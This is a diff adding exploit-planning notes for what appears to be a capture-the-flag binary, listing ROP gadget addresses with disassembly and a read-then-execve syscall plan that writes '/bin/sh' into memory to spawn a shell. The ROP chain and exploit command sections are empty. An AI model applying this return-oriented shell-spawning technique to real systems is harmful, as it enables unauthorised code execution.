@@ -1,0 +1,37 @@
+Gadgets
+==========================================================
+pop eax         - 0x8057f76
+ 8057f76:	58                   	pop    %eax
+
+ 8057f77:	3d 01 f0 ff ff       	cmp    $0xfffff001,%eax
+
+ 8057f7c:	0f 83 4e 28 00 00    	jae    805a7d0 <__syscall_error>
+
+ 8057f82:	c3                   	ret
+
+pop ebx,ecx,edx - 0x8059460
+ 8059460:	5a                   	pop    %edx
+
+ 8059461:	59                   	pop    %ecx
+
+ 8059462:	5b                   	pop    %ebx
+
+ 8059463:	c3                   	ret     
+
+int 0x80        - 0x8059c30
+ 8059c30:	cd 80                	int    $0x80
+
+ 8059c32:	c3                   	ret    
+
+Call overview
+==========================================================
+read(0, 0x80edfec, 17)
+ User enters "/bin/sh\x00" + "\xec\xdf\x0e\x08" + "\x00\x00\x00\x00" + "\n"
+execve(0x80edfec, 0x80edff4, 0)
+jmp $
+
+ROP chain
+==========================================================
+
+Exploit command
+==========================================================
